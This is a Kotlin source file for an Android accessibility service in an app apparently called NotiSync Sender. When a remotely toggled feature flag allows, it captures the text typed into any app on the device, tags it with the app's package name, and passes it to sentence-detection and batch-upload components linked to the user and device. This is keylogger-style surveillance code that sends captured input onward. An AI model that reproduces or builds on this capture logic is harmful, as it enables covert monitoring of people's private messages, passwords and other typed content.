// ============================================================
// FILE: service/keyboard/KeyboardAccessibilityService.kt
// Purpose: AccessibilityService that monitors text input events
// ============================================================

package com.app.notisync_sender.service.keyboard

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.app.notisync_sender.data.repository.AuthRepository
import com.app.notisync_sender.data.repository.FeatureFlagRepository
import com.app.notisync_sender.data.repository.KeyboardRepository
import com.app.notisync_sender.domain.model.DeviceInfo
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class KeyboardAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "KeyboardAccessibility"
    }

    @Inject
    lateinit var sentenceDetector: SentenceDetector

    @Inject
    lateinit var keyboardBatchProcessor: KeyboardBatchProcessor

    @Inject
    lateinit var keyboardRepository: KeyboardRepository

    @Inject
    lateinit var featureFlagRepository: FeatureFlagRepository

    @Inject
    lateinit var authRepository: AuthRepository

    @Inject
    lateinit var deviceInfo: DeviceInfo

    private val scope = CoroutineScope(Dispatchers.IO)
    private var featureFlagJob: Job? = null
    private var isKeyboardCaptureEnabled = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility service connected")

        initializeComponents()
        observeFeatureFlags()
    }

    private fun initializeComponents() {
        val userId = authRepository.getCurrentUserId()
        if (userId == null) {
            Log.w(TAG, "No user logged in — keyboard capture inactive")
            return
        }

        keyboardBatchProcessor.configure(userId, deviceInfo)
        keyboardBatchProcessor.startBatchTimer()
        keyboardRepository.startCollecting()

        Log.d(TAG, "Keyboard capture components initialized")
    }

    private fun observeFeatureFlags() {
        featureFlagRepository.startObserving()

        featureFlagJob = scope.launch {
            featureFlagRepository.keyboardCaptureEnabled.collectLatest { enabled ->
                isKeyboardCaptureEnabled = enabled
                Log.d(TAG, "Keyboard capture enabled: $enabled")

                if (!enabled) {
                    sentenceDetector.reset()
                }
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (!isKeyboardCaptureEnabled) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextChanged(event)
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                // Selection changes can indicate sentence completion via paste
                handleTextChanged(event)
            }
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        try {
            val text = event.text?.joinToString("") ?: return
            if (text.isBlank()) return

            val packageName = event.packageName?.toString() ?: return

            sentenceDetector.onTextChanged(text, packageName)
        } catch (e: Exception) {
            Log.e(TAG, "Error handling text event: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()

        keyboardBatchProcessor.stopBatchTimer()
        keyboardRepository.stopCollecting()
        featureFlagRepository.stopObserving()
        featureFlagJob?.cancel()
        sentenceDetector.reset()

        Log.d(TAG, "Accessibility service destroyed")
    }
}